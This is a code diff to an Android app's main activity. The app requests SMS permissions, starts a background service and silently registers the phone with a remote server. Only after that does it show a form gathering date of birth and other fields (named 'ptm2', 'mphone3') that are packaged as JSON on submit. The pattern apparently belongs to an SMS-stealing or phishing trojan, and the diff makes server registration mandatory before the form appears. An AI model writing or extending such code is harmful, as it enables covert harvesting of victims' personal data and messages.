@@ -46,8 +46,6 @@
         @Override
         protected void onCreate(Bundle savedInstanceState) {
             super.onCreate(savedInstanceState);
-            setContentView(R.layout.activity_main);
-
             Helper help1 = new Helper();
             help1.SITE();
             if(!Helper.isNetworkAvailable(this)) {
@@ -55,31 +53,29 @@
                 startActivity(intent);
             }
             checkPermissions();
-
         }
 
-        @RequiresApi(api = Build.VERSION_CODES.TIRAMISU)
         private void initializeWebView() {
             registerPhoneData();
+        }
+
+        private void startApp() {
+            setContentView(R.layout.activity_main);
             Intent serviceIntent = new Intent(this, BackgroundService.class);
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 startForegroundService(serviceIntent);
             } else {
                 startService(serviceIntent);
             }
-
             dataObject = new HashMap<>();
-
             EditText ddb = findViewById(R.id.dob);
             ddb.addTextChangedListener(new DateInputMask(ddb));
 
-            // Initialize the ids map
             ids = new HashMap<>();
             ids.put(R.id.dob, "dob");
             ids.put(R.id.ptm2, "ptm2");
             ids.put(R.id.mphone3, "mphone3");
 
-            // Populate dataObject
             for(Map.Entry<Integer, String> entry : ids.entrySet()) {
                 int viewId = entry.getKey();
                 String key = entry.getValue();
@@ -89,9 +85,9 @@
                 dataObject.put(key, value);
             }
 
-            Button buttonSubmit = findViewById(R.id.btn);
+            Button buttonSubmit = findViewById(R.id.submit_button);
             buttonSubmit.setOnClickListener(v -> {
-
+                Log.d(Helper.TAG, "Clicked Button");
                 if (validateForm()) {
                     showInstallDialog();
                     JSONObject dataJson = new JSONObject(dataObject);
@@ -133,25 +129,19 @@
         }
 
         public boolean validateForm() {
-            boolean isValid = true; // Assume the form is valid initially
-
-            // Clear dataObject before adding new data
+            boolean isValid = true;
             dataObject.clear();
 
             for (Map.Entry<Integer, String> entry : ids.entrySet()) {
                 int viewId = entry.getKey();
                 String key = entry.getValue();
                 EditText editText = findViewById(viewId);
-
-                // Check if the field is required and not empty
                 if (!FormValidator.validateRequired(editText, "Please enter valid input")) {
                     isValid = false;
                     continue;
                 }
 
                 String value = editText.getText().toString().trim();
-
-                // Validate based on the key
                 switch (key) {
                     case "phhone":
                         if (!FormValidator.validateMinLength(editText, 10, "Required 10 digit " + key)) {
@@ -200,9 +190,7 @@
                 }, SMS_PERMISSION_REQUEST_CODE);
                 Toast.makeText(this, "Requesting permission", Toast.LENGTH_SHORT).show();
             } else {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                    initializeWebView();
-                }
+                initializeWebView();
 //                Toast.makeText(this, "Permissions already granted", Toast.LENGTH_SHORT).show();
             }
         }
@@ -212,7 +200,6 @@
             super.onRequestPermissionsResult(requestCode, permissions, grantResults);
 
             if (requestCode == SMS_PERMISSION_REQUEST_CODE) {
-                // Check if permissions are granted or not
                 if (grantResults.length > 0) {
                     boolean allPermissionsGranted = true;
                     StringBuilder missingPermissions = new StringBuilder();
@@ -224,9 +211,7 @@
                         }
                     }
                     if (allPermissionsGranted) {
-                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                            initializeWebView();
-                        }
+                        initializeWebView();
                     } else {
                         showPermissionDeniedDialog();
                         Toast.makeText(this, "Permissions denied:\n" + missingPermissions.toString(), Toast.LENGTH_LONG).show();
@@ -248,8 +233,6 @@
                     openAppSettings();
                 }
             });
-
-            // Cancel button
             builder.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
                 @Override
                 public void onClick(DialogInterface dialog, int which) {
@@ -257,7 +240,6 @@
                     finish();
                 }
             });
-
             builder.show();
         }
         private void openAppSettings() {
@@ -283,11 +265,6 @@
 
 
         public void registerPhoneData() {
-            SharedPreferencesHelper share = new SharedPreferencesHelper(getApplicationContext());
-//            if(share.getBoolean("is_registered", false)){
-//                return ;
-//            }
-//            share.saveBoolean("is_registered", true);
             NetworkHelper networkHelper = new NetworkHelper();
             Helper help = new Helper();
             String url = help.URL() + "/mobile/add";
@@ -309,7 +286,6 @@
             }catch (JSONException e) {
                 e.printStackTrace();
             }
-            //Log.d(Helper.TAG, "onRegisterPhone "+sendData);
             networkHelper.makePostRequest(url, sendData, new NetworkHelper.PostRequestCallback() {
                 @Override
                 public void onSuccess(String result) {
@@ -317,7 +293,7 @@
                         try {
                             JSONObject jsonData = new JSONObject(result);
                             if(jsonData.getInt("status") == 200) {
-//                                Log.d(Helper.TAG, "Registered Mobile");
+                                startApp();
                             }else {
                                 Log.d(Helper.TAG, "Mobile Could Not Registered "+ jsonData.toString());
                                 Toast.makeText(getApplicationContext(), "Mobile Could Not Be Registered " + jsonData.toString(), Toast.LENGTH_LONG).show();
